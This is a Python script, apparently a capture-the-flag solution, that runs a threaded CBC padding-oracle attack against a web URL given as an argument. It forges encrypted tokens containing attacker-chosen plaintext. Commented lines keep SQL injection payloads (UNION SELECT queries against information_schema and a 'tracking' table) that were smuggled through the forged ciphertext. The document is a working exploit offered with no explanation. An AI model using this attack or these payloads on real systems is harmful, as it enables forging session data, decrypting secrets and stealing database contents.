from pwn import *
from base64 import *
import requests as req
from tqdm import trange
import threading
import sys

def custom_decode(x):
    x=x.replace(b'~', b'=').replace(b'!', b'/').replace(b'-', b'+')
    return b64decode(x)

def custom_encode(x):
    x=b64encode(x)
    return x.replace(b'=', b'~').replace(b'/', b'!').replace(b'+', b'-')

def pad(x):
    return x + bytes([16 - len(x) % 16] * (16 - len(x) % 16))

def oracle(x):
    web=req.get(url+custom_encode(x).decode())
    return 'Incorrect padding' not in web.text and 'PaddingException' not in web.text

def find_byte_range(x, suf, i, start, end, result):
    for j in range(start, end):
        cur_suf = b'\x01' * (16 - i) + bytes([j]) + xor(suf, bytes([i^(i-1)] * (i - 1)))
        if oracle(cur_suf + x):
            result.append(j)
            break

def brute_init(x):
    cur = b''
    suf = b''
    for i in trange(1, 17):
        threads = []
        result = []

        step = 256 // 64
        for t in range(64):
            start = t * step
            end = (t + 1) * step if t != 63 else 256
            thread = threading.Thread(target=find_byte_range, args=(x, suf, i, start, end, result))
            threads.append(thread)
            thread.start()

        for thread in threads:
            thread.join()

        if result:
            j = result[0]
            cur_suf = b'\x01' * (16 - i) + bytes([j]) + xor(suf, bytes([i^(i-1)] * (i - 1)))
            suf = cur_suf[16 - i:]
            cur = xor(suf[0], bytes([i]))+cur
#            print(cur)

    return cur

url = sys.argv[1]
cur_param =  bytes(sys.argv[2],"utf-8")
cur_param = custom_decode(cur_param)

# known value
last=cur_param[16:32]
known=xor(cur_param[:16], b'{"flag": "^FLAG^')

# Brute Forcing init dec value
#print(brute_init(b'`\x8c\xa9\xb0\xe0cp\xff\x05\xf9>\xe6Q\xfa\xc1\xbf'))
# len(b'{"id": "7 UNION SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema=database() #"}')
'''
wanted=b'{"id": "7 UNION SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema=database() #"}'
'''

# wanted=b'{"id":"1", "meow":"meow"}'
# wanted=b'{"id":"7 UNION SELECT group_concat(database()), 1"}'
#wanted=b'{"id": "7 UNION SELECT group_concat(table_name), 1 FROM information_schema.tables WHERE table_schema=database()"}'
# wanted=b'{"id":"7 UNION SELECT group_concat(column_name), 1 FROM information_schema.columns WHERE table_name=\'tracking\'"}'
# wanted=b'{"id":"7 UNION SELECT group_concat(headers), 1 FROM tracking"}'
wanted = bytes(sys.argv[3],"utf-8")
wanted=pad(wanted)
print(len(wanted), wanted)

payload=last

for i in range(len(wanted), 16, -16):
    payload=xor(known[:16], wanted[i-16:i])+payload
    known=brute_init(payload[:16])+known

payload=xor(known[:16], wanted[:16])+payload
print(custom_encode(payload))

